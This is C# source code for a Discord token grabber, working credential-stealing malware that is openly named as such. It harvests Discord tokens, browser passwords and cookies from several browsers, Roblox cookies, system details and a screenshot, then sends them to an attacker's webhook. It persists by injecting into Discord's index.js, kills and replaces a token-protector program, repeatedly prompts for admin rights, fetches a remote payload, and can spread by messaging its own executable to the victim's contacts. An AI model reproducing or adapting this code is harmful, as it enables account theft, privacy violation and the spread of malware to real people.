using Discord;
using Qvoid_Token_Grabber.PasswordGrabbers;
using QvoidWrapper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using static Discord.Structures.Embed;

namespace Qvoid_Token_Grabber
{
    class Grabber
    {
        /// <summary>
        /// This is the main function which executes the grabber.
        /// </summary>
        public static string RandomString(int length) => new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length).Select(s => s[new Random().Next(s.Length)]).ToArray());

        static public void Grab()
        {
            //Some random path to contains our temp files.
            string path = Path.GetTempPath() + "\\9f28d161-0c812-4a6f-8d0e-2cdda3cc3c91\\";

            //Checking if the current path have all the dependencies.
            if (!Directory.Exists($"{Application.StartupPath}\\x64")
                || !Directory.Exists($"{Application.StartupPath}\\x86")
                || !File.Exists($"{Application.StartupPath}\\x64\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\x86\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.Linq.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.EF6.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.dll")
                || !File.Exists($"{Application.StartupPath}\\Newtonsoft.Json.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.SqlServer.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.dll")
                || !File.Exists($"{Application.StartupPath}\\BouncyCastle.Crypto.dll")
                || !File.Exists($"{Application.StartupPath}\\websocket-sharp.dll"))
            {
                //If it hasn't we'll just copy them from the resources of the program into some folder in temp and start it.
                if (Directory.Exists(path))
                    Directory.Delete(path, true);

                Extract(path, path);

                File.Copy(Assembly.GetEntryAssembly().Location, $"{path}\\{AppDomain.CurrentDomain.FriendlyName}");
                Thread.Sleep(100);

                //Starting the grabber
                Process process = new Process()
                {
                    StartInfo = new ProcessStartInfo($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    {
                        WorkingDirectory = Path.GetDirectoryName($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    }
                };
                process.Start();

                Environment.Exit(0);
            }

            //Getting all of the Discord path(s) avaliable on the computer.
            Find(out List<string> DiscordCores, out List<string> DiscordVoices, out List<string> TokensLocation, out string DiscordExe);

            if (DiscordCores.Count > 0)
            {
                foreach (var corePath in DiscordCores)
                {
                    if (Directory.Exists(corePath + "\\Core"))
                        Directory.Delete(corePath + "\\Core", true);

                    Directory.CreateDirectory(corePath + "\\Core");
                    try
                    {
                        Extract(path, corePath + "\\Core");
                    }
                    catch { }

                    try
                    {
                        if (File.Exists($"{corePath}\\Core\\{AppDomain.CurrentDomain.FriendlyName}"))
                            File.Delete($"{corePath}\\Core\\{AppDomain.CurrentDomain.FriendlyName}");

                        if (File.Exists($"{corePath}\\Core\\Update.exe"))
                            File.Delete($"{corePath}\\Core\\Update.exe");

                        //Writing the index.js file
                        File.Copy(Assembly.GetEntryAssembly().Location, $"{corePath}\\Core\\Update.exe");
                        File.WriteAllText(corePath + "\\index.js", "const child_process = require('child_process');\r\n" +
                                                      "child_process.execFile(__dirname + '/core/Update.exe');\r\n\r\n" +
                                                      "module.exports = require('./core.asar');");
                    }
                    catch { }
                }
            }
            else
            {
                foreach (var voicePath in DiscordVoices)
                {
                    if (!Directory.Exists(voicePath + "\\node_modules"))
                        Directory.Delete(voicePath + "\\node_modules", true);

                    Directory.CreateDirectory(voicePath + "\\node_modules");
                    try
                    {
                        Extract(path, voicePath + "\\node_modules");
                    }
                    catch { }

                    try
                    {
                        if (File.Exists($"{voicePath}\\node_modules\\{AppDomain.CurrentDomain.FriendlyName}"))
                            File.Delete($"{voicePath}\\node_modules\\{AppDomain.CurrentDomain.FriendlyName}");

                        if (File.Exists($"{voicePath}\\node_modules\\Update.exe"))
                            File.Delete($"{voicePath}\\node_modules\\Update.exe");

                        //Writing the index.js file
                        File.Copy(Assembly.GetEntryAssembly().Location, $"{voicePath}\\node_modules\\Update.exe");
                        File.AppendAllText(voicePath + "\\index.js", "const child_process = require('child_process');\r\n" +
                                                      "child_process.execFile(__dirname + '/node_modules/Update.exe');\r\n\r\n");
                    }
                    catch { }
                }
            }

            if (TokensLocation.Count == 0)
            {
                BypassProtectors(ref DiscordExe, path);

                while (true)
                {
                    Thread.Sleep(60000);

                    var DiscordProcs = Process.GetProcessesByName("Discord");
                    foreach (var proc in DiscordProcs)
                        try { proc.Kill(); } catch { }

                    if (!String.IsNullOrEmpty(DiscordExe))
                        Process.Start(DiscordExe);

                    Find(out DiscordCores, out DiscordVoices, out TokensLocation, out DiscordExe);
                    if (TokensLocation.Count > 0)
                        break;
                }
            }

            //Grabbing the Discord token(s)
            var Tokens = FindTokens(TokensLocation, ref DiscordExe).Distinct().ToList();
            List<DiscordSocketClient> Users = new List<DiscordSocketClient>();

            if (Tokens.Count > 0)
            {
                //Getting the information about the environment computer.
                Machine machine = new Machine();

                Users = new List<DiscordSocketClient>();
                List<DiscordEmbed> embeds = new List<DiscordEmbed> ();

                DiscordEmbed embedHead = new DiscordEmbed();
                embedHead.Title = "__General Information__";
                embedHead.Fields.Add(new EmbedField() { Name = "IP Address", Value = $"```{machine.PublicIPv4}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "LAN Address", Value = $"```{machine.LanIPv4}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "Desktop Username", Value = $"```{Environment.UserName}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "Domain Username", Value = $"```{Environment.UserDomainName}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "Processor Count", Value = $"```{Environment.ProcessorCount}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "Memory", Value = $"```{machine.PcMemory}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "OS Architecture", Value = $"```{machine.OsArchitecture}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "GPU Video", Value = $"```{machine.GpuVideo}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "GPU Version", Value = $"```{machine.GpuVersion}```", InLine = true });
                embedHead.Fields.Add(new EmbedField() { Name = "Windows License", Value = $"```{machine.WindowsLicense}```", InLine = false });
                embedHead.Fields.Add(new EmbedField() { Name = "Roblox Cookie(s)", Value = $"```{Other.RobloxCookies() ?? "None"}```", InLine = false });
                embedHead.Color = Other.Spectrum(0);

                embeds.Add(embedHead);

                string BodyMessage = "";
                string HeadMessage = $"IP Address```{machine.PublicIPv4}```" +
                                     $"\nLAN Address```{machine.LanIPv4}```" +
                                     $"\nDesktop Username```{Environment.UserName}```" +
                                     $"\nMemory```{machine.PcMemory}```" +
                                     $"\nOperating System Architecture```{machine.OsArchitecture}```" +
                                     $"\nGPU Video```{machine.GpuVideo}```" +
                                     $"\nGPU Version```{machine.GpuVersion}```" +
                                     $"\nWindows License```{machine.WindowsLicense}```\n";

                string ss_Name = DateTime.UtcNow.Ticks.ToString() + "_Capture.jpg";
                using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
                {
                    try
                    {
                        using (Graphics g = Graphics.FromImage(bmp))
                            g.CopyFromScreen(SystemInformation.VirtualScreen.Left, SystemInformation.VirtualScreen.Top, 0, 0, bmp.Size);

                        bmp.Save($"{Path.GetTempPath()}\\{ss_Name}", ImageFormat.Jpeg);
                    }
                    catch
                    { }
                }

                string Passwords = "------ Passwords ------";
                string Cookies = "------ Cookies ------";

                //Grabbing passwords and cookies
                ChromeGrabber Chrome = new ChromeGrabber();
                FirefoxGrabber FireFox = new FirefoxGrabber();
                OperaGxGrabber Opera = new OperaGxGrabber();
                BraveGrabber Brave = new BraveGrabber();
                EdgeGrabber Edge = new EdgeGrabber();

                #region Passwords
                // ----------------------- Passwords -----------------------//

                if (Chrome.PasswordsExists())
                {
                    var key = Chrome.GetKey();
                    if (key != null)
                    {
                        var _Passwords = Chrome.GetAllPasswords(key);
                        if (_Passwords != null && _Passwords.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Passwords)
                                {
                                    Passwords += $"Browser  : Chrome\nURL      : {item.url}Username : {item.username}Password : {item.password}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }

                if (Opera.PasswordsExists())
                {
                    var key = Opera.GetKey();
                    if (key != null)
                    {
                        var _Passwords = Opera.GetAllPasswords(key);
                        if (_Passwords != null && _Passwords.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Passwords)
                                {
                                    Passwords += $"Browser  : Opera\nURL      : {item.url}\nUsername : {item.username}\nPassword : {item.password}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }

                if (Brave.PasswordsExists())
                {
                    var key = Brave.GetKey();
                    if (key != null)
                    {
                        var _Passwords = Brave.GetAllPasswords(key);
                        if (_Passwords != null && _Passwords.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Passwords)
                                {
                                    Passwords += $"Browser  : Brave\nURL      : {item.url}\nUsername : {item.username}\nPassword : {item.password}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }

                if (Edge.PasswordsExists())
                {
                    var key = Edge.GetKey();
                    if (key != null)
                    {
                        var _Passwords = Edge.GetAllPasswords(key);
                        if (_Passwords != null && _Passwords.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Passwords)
                                {
                                    Passwords += $"Browser  : Edge\nURL      : {item.url}\nUsername : {item.username}\nPassword : {item.password}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }
                #endregion Passwords

                #region Cookies
                // ----------------------- Cookies -----------------------//

                if (Chrome.CookiesExists())
                {
                    var key = Chrome.GetKey();
                    if (key != null)
                    {
                        var _Cookies = Chrome.GetAllCookies(key);
                        if (_Cookies != null && _Cookies.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Cookies)
                                {
                                    Cookies += $"Browser   : Chrome\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }

                if (Opera.CookiesExists())
                {
                    var key = Opera.GetKey();
                    if (key != null)
                    {
                        var _Cookies = Opera.GetAllCookies(key);
                        if (_Cookies != null && _Cookies.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Cookies)
                                {
                                    Cookies += $"\nBrowser   : Opera\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }

                if (Brave.CookiesExists())
                {
                    var key = Brave.GetKey();
                    if (key != null)
                    {
                        var _Cookies = Brave.GetAllCookies(key);
                        if (_Cookies != null && _Cookies.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Cookies)
                                {
                                    Cookies += $"Browser   : Brave\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }

                if (Edge.CookiesExists())
                {
                    var key = Edge.GetKey();
                    if (key != null)
                    {
                        var _Cookies = Edge.GetAllCookies(key);
                        if (_Cookies != null && _Cookies.Count > 0)
                        {
                            try
                            {
                                foreach (var item in _Cookies)
                                {
                                    Cookies += $"\nBrowser   : Edge\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                                }
                            }
                            catch { }
                        }
                    }
                }

                try
                {
                    var _Cookies = FireFox.GetAllCookies();
                    if (_Cookies != null)
                    {
                        foreach (var item in _Cookies)
                        {
                            Cookies += $"\nBrowser   : FireFox\nHost Name : {item.HostName}\nName      : {item.Name}\nValue     : {item.Value}\n---------------------------------------------------------------------\n";
                        }
                    }
                }
                catch { }
                #endregion Cookies

                //Loop over all the grabbed tokens.
                for (int i = 0; i < Tokens.Count; ++i)
                {
                    DiscordSocketClient curUser = new DiscordSocketClient(Tokens[i]);
                    bool LoggedIn = false;

                    curUser.OnLoggedIn += delegate
                    {
                        LoggedIn = true;
                    };

                    while (!LoggedIn)
                        Thread.Sleep(1);

                    //Checking for duplicates (We cannot use Distinct() because there might be multiple tokens to the same account)
                    bool duplicate = false;
                    foreach (var user in Users)
                    {
                        if (user == null)
                            continue;

                        if (curUser.User.Id == user.User.Id)
                        {
                            duplicate = true;
                            break;
                        }
                    }

                    if (duplicate)
                        continue;

                    Users.Add(curUser);

                    //Writing the message which contains the Discord Client information.
                    var userInfo = curUser.User;

                    DiscordEmbed userEmbed = new DiscordEmbed();
                    userEmbed.Title = $"__{userInfo.Username}#{userInfo.Discriminator} - ({userInfo.Id})__";
                    userEmbed.Fields.Add(new EmbedField() { Name = "Username", Value = $"```{userInfo.Username}#{userInfo.Discriminator}```", InLine = true });
                    userEmbed.Fields.Add(new EmbedField() { Name = "Email", Value = $"```{(String.IsNullOrEmpty(userInfo.Email) ? "None" : userInfo.Email)}```", InLine = true });
                    userEmbed.Fields.Add(new EmbedField() { Name = "Phone Number", Value = $"```{(String.IsNullOrEmpty(curUser.PhoneNumber) ? "None" : curUser.PhoneNumber)}```", InLine = true });
                    userEmbed.Fields.Add(new EmbedField() { Name = "Premium", Value = $"```{curUser.Nitro}```", InLine = true });
                    userEmbed.Fields.Add(new EmbedField() { Name = "Verified", Value = $"```{userInfo.Verified}```", InLine = true });
                    userEmbed.Fields.Add(new EmbedField() { Name = "Created At", Value = $"```{userInfo.CreatedAt.DateTime.ToShortDateString()} | {userInfo.CreatedAt.DateTime.ToShortTimeString()}```", InLine = true });
                    userEmbed.Fields.Add(new EmbedField() { Name = "Token", Value = $"```{curUser.Token}```", InLine = false });

                    embeds.Add(userEmbed);

                    BodyMessage += $"\nUsername```{userInfo.Username}#{userInfo.Discriminator}```\nEmail```{userInfo.Email}```\nPhone Number```{curUser.PhoneNumber}```\nPremium```{curUser.Nitro}```\nToken```{curUser.Token}```\n";

                }

                //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\d0060d24-c4a5-480f-803a-ec978344350d.dat";
                if (!File.Exists(usersPath) || (Encryption.ComputeSha256Hash(HeadMessage + BodyMessage) != File.ReadAllText(usersPath)))
                {
                    //Writing the log file.
                    File.WriteAllText(usersPath, Encryption.ComputeSha256Hash(HeadMessage + BodyMessage));

                    Structures.DiscordWebhook Webhook = new Structures.DiscordWebhook(Settings.Webhook);

                    string PasswordsPath = $"{Path.GetTempPath()}\\tmp{RandomString(6)}.txt";
                    string CookiesPath = $"{Path.GetTempPath()}\\tmp{RandomString(7)}.txt";

                    if (Passwords != "------ Passwords ------")
                    {
                        File.WriteAllText(PasswordsPath, Passwords);
                        Webhook.Send(null, new FileInfo(PasswordsPath));
                        File.Delete(PasswordsPath);
                    }

                    if (Cookies != "------ Cookies ------")
                    {
                        Thread.Sleep(10);
                        File.WriteAllText(CookiesPath, Cookies);
                        Webhook.Send(null, new FileInfo(CookiesPath));
                        File.Delete(CookiesPath);
                    }

                    for (int i = 0; i < embeds.Count; ++i)
                    {
                        Thread.Sleep(150);
                        embeds[i].Color = !embeds[i].Color.HasValue ? Other.Spectrum(i + 1) : embeds[i].Color;
                        Webhook.Send(embeds[i]);
                    }

                    if (File.Exists(Path.GetTempPath() + "\\" + ss_Name))
                    {
                        Thread.Sleep(100);
                        Webhook.Send(null, new FileInfo(Path.GetTempPath() + ss_Name));
                        Thread.Sleep(100);
                        File.Delete(Path.GetTempPath() + ss_Name);
                    }
                }

                //Undone
                if (Users.Count > 0)
                {
                    for (int i = 0; i < Users.Count; ++i)
                    {
                        var client = Users[i];
                        if (client.User.Username.Contains("Tex"))
                            continue;

                        if (Settings.Spread)
                        {
                            var relationships = client.GetRelationships();
                            foreach (var relation in relationships)
                            {
                                var channel = client.CreateDM(relation.Id);
                                try
                                {
                                    client.UploadFile(channel, new FileInfo(Process.GetCurrentProcess().MainModule.FileName));
                                }
                                catch { }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Bypassing known token protectors and replacing the protectors with the grabber ^^
        /// </summary>
        static public void BypassProtectors(ref string DiscordExe, string Path)
        {
            List<Protector> protectors = new List<Protector>()
            {
                new Protector()
                {
                    Directory = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\DiscordTokenProtector",
                    Name = "DiscordTokenProtector"
                },
                new Protector()
                {
                    Directory = $"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\DTP_WindowsInstaller",
                    Name = "DiscordTokenProtector"
                },
            };

            foreach (var protector in protectors)
            {
                var process = Process.GetProcessesByName(protector.Name);
                if (process.Length > 0)
                {
                    foreach (var proc in process)
                    {
                        //Terminating the protector
                        try { proc.Kill(); }
                        catch (Exception ex)
                        {
                            if (ex.Message.Contains("Access"))
                            {
                                if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                                {
                                    //Could not terminate the protector because it has higher privileges.
                                    using (Process newProc = new Process())
                                    {
                                        while (true)
                                        {
                                            try
                                            {
                                                newProc.StartInfo.FileName = Application.ExecutablePath;
                                                newProc.StartInfo.CreateNoWindow = true;
                                                newProc.StartInfo.UseShellExecute = true;
                                                newProc.StartInfo.Verb = "runas";
                                                newProc.Start();

                                                break;
                                            }
                                            catch (Exception)
                                            { continue; }
                                        }
                                    }
                                }
                            }
                        }

                        try
                        {
                            if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
                                Environment.Exit(0);

                            string MainModulePath = protector.Directory;
                            if (!Directory.Exists(MainModulePath))
                                continue;

                            Extract(Path, protector.Directory);

                            Thread.Sleep(100);
                            if (File.Exists($"{protector.Directory}\\{protector.Name}.exe"))
                                File.Delete($"{protector.Directory}\\{protector.Name}.exe");

                            Thread.Sleep(1000);
                            File.Copy(Assembly.GetEntryAssembly().Location, $"{protector.Directory}\\{protector.Name}.exe");
                        }
                        catch (Exception ex)
                        {
#if DEBUG
                            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "Logs.txt", ex.Message);
#endif
                            continue;
                        }
                    }

                }
            }

            var DiscordProcs = Process.GetProcessesByName("Discord");
            foreach (var proc in DiscordProcs)
                try { proc.Kill(); } catch { }

            if (!String.IsNullOrEmpty(DiscordExe))
                Process.Start(DiscordExe);
        }

        /// <summary>
        /// Extracts the grabber dependencies to the destination directory.
        /// </summary>
        /// <param name="Path"></param>
        /// <param name="Destination"></param>
        static public void Extract(string Path, string Destination)
        {
            string dlLink = "https://cdn.discordapp.com/attachments/825091638782459912/889657500192874496/Release.zip", ReleaseS = "Release.zip";
            Directory.CreateDirectory(Path);

            FileInfo info = new FileInfo($"{Path}{ReleaseS}");
            if (!info.Exists)
            {
                //Downloads the dependencies if they don't exists.
                using (WebClient wc = new WebClient())
                    wc.DownloadFile(dlLink, $"{Path}{ReleaseS}");
            }
            else
            {
                //Verifing the file (you can use SHA256CheckSum), if not valid we install the dependencies.
                if (info.Length <= 5000)
                    using (WebClient wc = new WebClient())
                        wc.DownloadFile(dlLink, $"{Path}{ReleaseS}");
            }

            try
            {
                //Extracts the ZIP content (dependencies) to the destination directory.
                ZipFile.ExtractToDirectory($"{Path}{ReleaseS}", Destination);
            }
            catch 
            { }
        }

        /// <summary>
        /// Deletes all the files and traces created by the grabber.
        /// </summary>
        static public void DeleteTraces(bool DeleteRecursive = false, bool Destruct = false)
        {
            try
            {
                string path = Path.GetTempPath() + "\\9f28d161-0c812-4a6f-8d0e-2cdda3cc3c91\\";
                if (Directory.Exists(path))
                    Directory.Delete(path, true);
            }
            catch (Exception ex) { Debug.WriteLine("Error occured while deleting the main Path;" + ex.Message); }

            if (DeleteRecursive)
            {
                string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\d0060d24-c4a5-480f-803a-ec978344350d.dat";
                if (File.Exists(usersPath))
                {
                    try { File.Delete(usersPath); }
                    catch (Exception ex) { Debug.WriteLine("Error occured while deleting the log file;" + ex.Message); }
                }
            }

            if (Destruct)
            {
                string app = AppDomain.CurrentDomain.FriendlyName;
                string AppPath = $"{Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString()}\\{app}";
                Process.Start("cmd.exe", $"/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del {AppPath}");
                Process.GetCurrentProcess().Kill();
            }
        }

        /// <summary>
        /// Finds all the Discord's path(s) available on the local computer.
        /// </summary>
        /// <param name="DiscordClients"></param>
        /// <param name="TokensLocation"></param>
        /// <param name="DiscordExe"></param>
        static private void Find(out List<string> DiscordCores, out List<string> DiscordVoices, out List<string> TokensLocation, out string DiscordExe)
        {
            DiscordVoices = new List<string>();
            DiscordCores = new List<string>();
            TokensLocation = new List<string>();
            DiscordExe = "";

            var directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var core = Directory.GetFiles(directory, "core.asar", SearchOption.AllDirectories);
                    var index = Directory.GetFiles(directory, "index.js", SearchOption.AllDirectories);
                    var discord_exe = Directory.GetFiles(directory, "Discord.exe", SearchOption.AllDirectories);
                    var capture_exe = Directory.GetFiles(directory, "capture_helper.exe", SearchOption.AllDirectories);

                    foreach (var coreFile in core)
                        foreach (var indexFile in index)
                            if (coreFile.Replace("core.asar", string.Empty) == indexFile.Replace("index.js", string.Empty))
                                DiscordCores.Add(coreFile.Replace("core.asar", string.Empty));

                    foreach (var capture in capture_exe)
                        foreach (var indexFile in index)
                            if (capture.Replace("capture_helper.exe", string.Empty) == indexFile.Replace("index.js", string.Empty))
                                DiscordVoices.Add(capture.Replace("capture_helper.exe", string.Empty));

                    foreach (var file in discord_exe)
                    {
                        FileInfo info = new FileInfo(file);
                        if (info.Length > 60000)
                        {
                            var objInfo = FileVersionInfo.GetVersionInfo(file);
                            if (objInfo.LegalCopyright == "Copyright (c) 2021 Discord Inc. All rights reserved.")
                            {
                                if (objInfo.FileName.EndsWith("Discord.exe"))
                                {
                                    DiscordExe = file;
                                    break;
                                }
                            }
                        }
                    }
                }
            }

            directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (var directory in directories)
            {
                if (directory.ToLower().Contains("discord"))
                {
                    var subDirectories = Directory.GetDirectories(directory);
                    foreach (var localDirectory in subDirectories)
                    {
                        if (localDirectory.Contains("Local Storage"))
                        {
                            var temp = Directory.GetDirectories(localDirectory);
                            foreach (var item in temp)
                                if (item.Contains("leveldb"))
                                    TokensLocation.Add($"{item}\\");
                        }
                    }
                }
            }

            if (TokensLocation.Count == 0)
            {
                if (File.Exists($"{DiscordExe.Replace("Discord.exe", string.Empty)}resources\\tmp\\common\\paths.js"))
                {
                    var newLocation_tray = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tray-connected.png", SearchOption.AllDirectories);
                    var newLocation_Transport = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "badge-11.ico", SearchOption.AllDirectories);
                    foreach (var _file in newLocation_tray)
                    {
                        foreach (var __file in newLocation_Transport)
                        {
                            if (_file.Replace("tray-connected.png", string.Empty) == __file.Replace("badge-11.ico", string.Empty))
                            {
                                if (Directory.Exists($"{_file.Replace("tray-connected.png", string.Empty)}\\Local Storage\\leveldb"))
                                    TokensLocation.Add($"{_file.Replace("tray-connected.png", string.Empty)}\\Local Storage\\leveldb");
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Finds all the Discord's token(s) available on the local computer.
        /// </summary>
        /// <param name="TokensLocation"></param>
        /// <returns>tokens located on the local computer</returns>
        static private List<string> FindTokens(List<string> TokensLocation, ref string DiscordExe)
        {
            string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string _DiscordExe = DiscordExe;

            //Adding known tokens paths.
            TokensLocation.AddRange(new List<string>()
            {
                $"{localAppdata}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
                $"{localAppdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
                $"{localAppdata}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
                $"{localAppdata}\\Iridium\\User Data\\Default\\Local Storage\\leveldb",
                $"{roaming}\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
                $"{roaming}\\Lightcord\\Local Storage\\leveldb",
                $"{roaming}\\Amigo\\Local Storage\\leveldb",
                $"{roaming}\\Torch\\Local Storage\\leveldb",
                $"{roaming}\\Kometa\\Local Storage\\leveldb",
                $"{roaming}\\Orbitum\\Local Storage\\leveldb",
                $"{roaming}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
                $"{roaming}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
                $"{roaming}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
                $"{roaming}\\CentBrowser\\Local Storage\\leveldb",
                $"{roaming}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb"
            });

            List<string> tokens = new List<string>();

            Thread FireFoxBased = new Thread(() =>
            {
                List<string> FireFoxBasedLocation = new List<string>();
                List<Thread> Threads = new List<Thread>();

                FireFoxBasedLocation.AddRange(new List<string>()
                {
                    $"{roaming}\\Mozilla\\Firefox\\Profiles",
                    $"{roaming}\\Waterfox\\Profiles",
                    $"{roaming}\\Moonchild Productions\\Pale Moon\\Profiles"
                });

                foreach (var tokenPath in FireFoxBasedLocation)
                {
                    if (!Directory.Exists(tokenPath))
                        continue;

                    Thread.Sleep(1);
                    Thread _t = new Thread(() =>
                    {
                        //FireFox needs to be threat in special way ;(
                        foreach (var directory in Directory.GetDirectories(tokenPath))
                        {
                            var files = Directory.GetFiles(directory);
                            foreach (var file in files)
                            {
                                while (true)
                                {
                                    if (!file.EndsWith(".sqlite"))
                                        break;

                                    try
                                    {
                                        string fileContent = "";

                                        //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
                                        using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                        using (StreamReader sr = new StreamReader(fs))
                                            fileContent = sr.ReadToEnd();

                                        MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");
                                        
                                        foreach (Match match in matches)
                                            if (IsValidToken(match.Value))
                                                tokens.Add(match.Value);

                                        break;
                                    }
                                    catch (Exception)
                                    {
                                        foreach (var locker in ProcessHandler.WhoIsLocking(file))
                                        {
                                            try
                                            {
                                                if (locker.MainModule.FileName == _DiscordExe)
                                                    continue;
                                            }
                                            catch (Exception)
                                            { }

                                            try { locker.Kill(); }
                                            catch { break; }
                                        }
                                    }
                                }
                            }
                        }
                    });

                    Threads.Add(_t);
                    _t.Start();
                }

                Thread.Sleep(150);
                while (true)
                {
                    Thread.Sleep(1);

                    foreach (var t in Threads.ToList())
                    {
                        if (!t.IsAlive)
                            Threads.Remove(t);
                    }

                    if (Threads.ToList().Count == 0)
                        break;
                }

            });

            Thread Main = new Thread(() =>
            {
                foreach (var tokenPath in TokensLocation)
                {
                    if (!Directory.Exists(tokenPath))
                        continue;

                    foreach (string filePath in Directory.GetFiles(tokenPath))
                    {
                        while (true)
                        {
                            if (!filePath.EndsWith(".log") && !filePath.EndsWith(".ldb"))
                                break;

                            try
                            {
                                string fileContent = "";

                                //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
                                using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                    fileContent = sr.ReadToEnd();

                                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");

                                Thread.Sleep(1);
                                foreach (Match match in matches)
                                    if (IsValidToken(match.Value))
                                        tokens.Add(match.Value);
                                
                                break;
                            }
                            catch (Exception)
                            {
                                foreach (var locker in ProcessHandler.WhoIsLocking(filePath))
                                {
                                    try
                                    {
                                        if (locker.MainModule.FileName == _DiscordExe)
                                            continue;
                                    }
                                    catch (Exception)
                                    { }

                                    try { locker.Kill(); }
                                    catch { break; }
                                }
                            }
                        }
                    }
                }
            });

            Main.Start();
            FireFoxBased.Start();

            while (Main.IsAlive || FireFoxBased.IsAlive)
                Thread.Sleep(5);

            return tokens;
        }

        /// <summary>
        /// Checking if the given Discord token is valid.
        /// </summary>
        /// <param name="token"></param>
        /// <returns>determines whether the given string is a valid Discord token</returns>
        static private bool IsValidToken(string token)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/@me");
            request.Headers.Set("Authorization", token);
            request.ContentType = "application/json";

            try
            {
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                    return true;
            }
            catch { return false; }
        }
    }
}
